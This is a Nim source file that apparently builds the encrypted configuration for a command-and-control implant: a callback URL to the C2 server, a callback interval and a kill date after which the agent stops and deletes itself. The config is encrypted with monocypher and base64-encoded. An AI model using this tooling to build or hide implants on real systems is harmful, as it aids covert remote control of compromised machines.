import protocol
import flatty 
import monocypher
import sysrandom
import std/oids
import times
import std/strutils
import std/json
import os

let URL_MAX_LEN = 256

#this is used to store the encrypted bytes
type
  EncConfig* = ref object
    privKey*: Key
    pubKey*: Key
    encObj: EncMsg

type
  StaticConfig* = ref object
    buildid: Oid      #generated on build
    deploymentid: Oid #generated on deployment
    killEpoch*: int32  #what point should the agent stop calling back and delete
    interval*: int32   #how often should the agent call back
    callback*: string  #where the C2 is 


proc serEncConfig*(encMsg:EncConfig): string = 
  result = toFlatty(encMsg)

proc desEncConfig*(serEncMsg:string): EncConfig = 
  result = serEncMsg.fromFlatty(EncConfig)

proc serConfig*(encMsg:StaticConfig): string = 
  result = toFlatty(encMsg)

proc desConfig*(serEncMsg:string): StaticConfig = 
  result = serEncMsg.fromFlatty(StaticConfig)


proc writeStringToFile(fileName: string, contents: string) =
  let f = open(filename, fmWrite)
  f.write(contents)
  defer: f.close()

proc readStringFromFile(fileName: string): string =
  let f = open(filename, fmRead)
  defer: f.close()
  result = f.readAll()

proc createEmptyConfig(): StaticConfig =
  var config = StaticConfig()
  config.buildid = genOid()
  config.deploymentid = genOid()
  config.killEpoch = 0
  config.interval = 0
  config.callback = "\0".repeat(URL_MAX_LEN)
  return config

proc createEncConfig(config:StaticConfig): EncConfig =
  let configBytes = cast[seq[byte]](serConfig(config))
  let encConfig = new EncConfig
  encConfig.privKey = getRandomBytes(sizeof(Key))
  encConfig.pubKey = crypto_key_exchange_public_key(encConfig.privKey)
  encConfig.encObj = encMsg(encConfig.privKey, encConfig.pubKey,configBytes)
  result = encConfig

proc readEncConfig*(encConfig:EncConfig): StaticConfig =
  let configBytes = decMsg(encConfig.privKey, encConfig.encObj)
  let config = desConfig(toString(configBytes))
  result = config

proc padUrl*(url:string): string =
  let urlLen = url.len
  if urlLen < URL_MAX_LEN:
    result = url & "\0".repeat(URL_MAX_LEN-urlLen)
  else:
    raise (newException(ValueError, "URL is too long"))
    result = url

proc genOutFile(configIn:string,configOut:string)= 
  let configJSONStr = readStringFromFile(configIn)
  let configJSON = parseJson(configJSONStr)

  echo configJSON
  let newConfig = createEmptyConfig()
  newConfig.callback = padUrl(configJSON["callback"].getStr)
  newConfig.killEpoch = int32(configJSON["killEpoch"].getInt)
  newConfig.interval = int32(configJSON["interval"].getInt)
  let encConfig = createEncConfig(newConfig)
  let b64Str = b64Str(toFlatty(encConfig))
  writeStringToFile(configOut, b64Str)


when isMainModule:
  import parseOpt

  # when defined(release):
  #   let configOut = "release.config"
  #   let configIn = "release.json"
  # else:
  #   let configOut = "debug.config"
  #   let configIn = "debug.json"

  let configOut = "release.config"
  let configIn = "release.json"
  # let configOut = "debug.config"
  # let configIn = "debug.json"


  genOutFile(configIn,configOut)